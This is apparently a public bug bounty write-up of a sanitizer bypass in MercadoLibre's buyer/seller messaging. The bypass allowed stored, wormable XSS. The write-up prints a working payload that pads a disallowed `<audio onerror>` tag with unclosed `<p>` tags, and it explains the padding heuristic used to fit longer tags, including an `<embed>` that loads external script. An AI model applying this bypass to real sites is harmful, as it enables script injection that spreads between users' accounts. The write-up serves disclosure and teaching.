**Public Report:** [https://hackerone.com/reports/1675516](https://hackerone.com/reports/1675516)

## Bypassing the sanitizer: Wormable XSS in MercadoLibre

**Report summary**

The general messaging functionality of www.mercadolibre.com.ar implemented an HTML sanitizer that allowed the use of a limited set of HTML tags while preventing XSS. While analyzing the functionality, @valent1ne discovered that sending multiple unclosed `<p>` tags (`<p><p><p><p><p><p><p><p>`) and appending an extra tag seemed to confuse the sanitizer parser, resulting in unexpected behavior.
This behavior allowed incluiding an extra arbitrary tag, bypassing the sanitizer. For instance, it enabled the appending of an `<audio>` HTML tag at the end of the following payload, which executed JavaScript code:

```html
<p><p><p><p><p><p><p><p><audio/src/onerror=alert(document.domain)>
```

Later, the reporter discovered that the number of unclosed `<p>` tags needed to be increased depending on the size of the appended HTML tag. This adjustment allowed the insertion of an <embed> tag that included external arbitrary HTML/JavaScript code.

After sending the payload, the parsed HTML would look like this:

```html
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p>
 <audio/src/onerror=alert(document.domain)>
</p>
```

Since this vulnerability affected the general messaging functionality of www.mercadolibre.com.ar, it could have been exploited as a wormable XSS, capable of spreading across multiple users.

**Discovery**

At first, while testing with buyer/seller accounts to buy/sell products, I knew that when buying a product it would always start a chat so that buyers and sellers could communicate. When making a claim, I quickly saw a request that piqued my curiosity:

```js
POST /<...>

message=%3Cp%3EClaim%20%23123456789%3C%2Fp%3E // Decoded: <p>Claim #123456789</p>
```

I thought, why does it use HTML? Are `<p>` tags in a sort of whitelist?

```js
—-------------  —--------------
|  allowed   |  | disallowed  |
—-------------   —--------------                  
|  <p>        |  |   <img>     |
|  <h1>       |  |     <...>   |
|  <h2>       |  |             |
—-------------   —--------------
```

Then, I tried to execute JS but it was using a sanitizer. That’s when I knew I needed to bypass it, so I started sending every single HTML tag, and noticed something weird.

I thought, how can I hide the disallowed HTML tag? Can I confuse the parser so it can’t see it?

```
—-----------------      —-----------------
|        <p>      |     |      <p>        |
—----------------- →    —-----------------  
|        <img>    |     |       <img>     |  
—-----------------      —------------------
                        |      </p>       | 
                        —------------------
—-----------------      —-----------------
|        <p>     |     |      <p>         |
—----------------- →    —------------------  
|        <p>     |     |       </p>       |  
—-----------------     —-------------------
|        <img>   |     |      <p>         | 
—-----------------      —------------------
                        |      <img>      |
                        —------------------
                        |      </p>       |
                        —------------------
```
                       
1. When sending `<p><p><img>`, it didn’t remove the `<img>` tag.
2. When just sending `<img>`, it was removed.

After multiple tests, I couldn’t figure out why the sanitizer was working like that. Now I would try to analyze the code to find the root cause, but at that time I didn’t have much experience with that, so I used abstraction and tested based on behavior, until an idea came up: "Balance is key".

A part of my thought process (might be wrong technically)

```
<p> <p>  <img> → sucess
[3] [3]   [5]
 —------
   [6]
 
<p> <p> <p>    <img/src=x> → error
[3] [3] [3]       [11]
–-—---------     
     [9]

<p> <p> <p> <p> <p>    <img/src=x> → sucess
[3] [3] [3] [3] [3]       [11]
–-—----------------     
        [12]

<p> <p> <p> <p> <p> <p> <p> <p> <p>   <audio/src/onerror=alert()> → sucess
[3] [3] [3] [3] [3] [3] [3] [3] [3]             [27]
–-—---------------------------------     
                 [27]
```

So, the pattern I recognized was something like:

```js
tags = ["<p>", "<p>"]
while (not success):
  tags += "<p>"
```
